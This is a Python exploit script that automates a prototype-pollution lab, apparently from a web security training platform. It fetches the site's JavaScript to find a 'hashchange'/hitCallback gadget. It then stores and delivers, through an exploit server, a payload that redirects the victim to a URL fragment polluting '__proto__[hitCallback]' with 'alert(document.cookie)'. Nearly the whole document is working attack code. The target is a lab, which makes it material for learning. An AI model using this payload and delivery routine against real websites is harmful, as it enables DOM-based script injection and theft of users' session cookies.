# Client-side prototype pollution in third-party libraries

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Stored at URL:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r

def find_js(s, url):
	print('\n[+] Trying to find javascript files loaded on the home page...')
	s.cookies.clear()
	s.headers.clear()
	r = s.get(url)
	js_files = re.findall(r"src='(.*)'></", r.text)
	for file_path in js_files:
		print('\n[+] Found javascript file path:\n%s' % file_path)
		js_content = s.get(url + file_path).text
		time.sleep(2)
		print('\n--------------------------------------------\n')
		print('%s' % js_content)
		print('\n--------------------------------------------')
		time.sleep(2)
		if 'hashchange' in js_content:
			print('[+] Found "hashchange" function that trigger a "hitCallback" gadget !')
			return file_path

def send_inject_prototype(s, url, attacker):
	print('\n[+] Trying to send javascript prototype pollution...')
	time.sleep(2)
	payload = f"""<script>
  location="{url}/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>"""
	send_payload(s, payload, attacker)

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Client-side prototype pollution in third-party libraries')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		exploit_srv = find_exploit_srv(r)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print("\n[+] Trying to send a find a javascript object to send a DOM XSS...")
			parsed_atk = urllib.parse.urlparse(exploit_srv)
			if parsed_atk.netloc == b'':
				print('[-] Cannot find exploit server... Already solved <!>')
				sys.exit(1)
			attacker = parsed_atk.scheme + '://' + parsed_atk.netloc
			path = find_js(s, url)
			time.sleep(2)
			r = send_inject_prototype(s, url, attacker)
			s.cookies.clear()
			time.sleep(5)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
